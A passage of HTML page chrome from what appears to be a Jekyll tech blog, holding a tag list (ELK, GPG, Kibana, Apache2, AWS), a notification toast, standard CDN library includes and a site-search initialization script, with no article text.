class="post-tag btn btn-outline-primary" href="/tags/elk/">ELK</a> <a class="post-tag btn btn-outline-primary" href="/tags/gpg/">GPG</a> <a class="post-tag btn btn-outline-primary" href="/tags/kibana/">Kibana</a> <a class="post-tag btn btn-outline-primary" href="/tags/apache2/">Apache2</a> <a class="post-tag btn btn-outline-primary" href="/tags/aws/">AWS</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.11/dayjs.min.js,npm/dayjs@1.11.11/locale/en.min.js,npm/dayjs@1.11.11/plugin/relativeTime.min.js,npm/dayjs@1.11.11/plugin/localizedFormat.min.js,npm/tocbot@4.27.20/dist/tocbot.min.js"></script> <script src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js"></script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
